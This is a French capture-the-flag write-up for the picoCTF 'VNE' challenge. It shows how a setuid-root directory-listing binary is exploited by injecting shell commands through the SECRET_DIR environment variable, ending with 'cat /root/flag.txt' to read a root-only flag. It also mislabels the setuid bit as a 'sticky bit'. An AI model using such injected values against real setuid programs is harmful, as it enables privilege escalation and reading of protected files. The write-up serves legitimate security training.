# VNE

## Enoncé
Catégorie : [Binary Exploitation](../)

Points : 200

Tags : `bash` `env` `injection`

Description :
> We've got a binary that can list directories as root, try it out !!  
> `ssh` to `saturn.picoctf.net:xxxxx`, and run the binary named "`bin`" once connected. Login as `ctf-player` with the password, `xxxxx`

Hints :
1. Have you checked the content of the /root folder
2. Find a way to add more instructions to the `ls`


## Approche

Après s'être connecté au serveur, on examine les fichiers présents dans le HOME directory du user `ctf-player` :
```bash
ctf-player@pico-chall$ ls -al
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 18 23:42 .
drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
drwx------ 2 ctf-player ctf-player    34 Mar 18 23:42 .cache
-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin
```

On constate que le "sticky bit" est positionné sur `bin`, permettant donc d'exécuter celui-ci avec les droits de son propriétaire (i.e. ici `root`)

Comme indiqué dans l'énoncé, on lance le binaire `bin` :
```bash
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

Le message d'erreur indique que la variable d'environnement `SECRET_DIR` doit être définie. D'après son nom, elle référence un répertoire "secret".

L'examen sur le type de fichier montre que `bin` est un exécutable 64bits : on ne peut pas savoir directement le traitement qu'il réalise :
```bash
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
```

## Solution

L'examen des droits du HOME directory du user `root`, montre que son accès est limité à `root` :
```bash
ctf-player@pico-chall$ ls -ld /root
drwx------ 1 root root 22 Mar 16 01:59 /root
```

`/root` semble donc un bon candidat en tant que `SECRET_DIR` :
```bash
ctf-player@pico-chall$ SECRET_DIR=/root ./bin
Listing the content of /root as root:
flag.txt
```

On constate que `bin` peut lister le contenu du répertoire `/root`, grâce au sticky bit.

En suivant la piste du tag `injection` de l'énoncé, on regarde le comportement lorsqu'on injecte une commande (ex: `echo coucou`) dans la variable `SECRET_DIR` :
```bash
ctf-player@pico-chall$ SECRET_DIR="/root;echo coucou" ./bin
Listing the content of /root;echo coucou as root:
flag.txt
coucou
```

On voit que la commande est exécutée. On renouvelle donc l'expérience avec cette fois une commande permettant de lire le contenu du fichier flag.txt :
```bash
ctf-player@pico-chall$ SECRET_DIR="/root;cat /root/flag.txt" ./bin
Listing the content of /root;cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_xxxxxxxx}
```
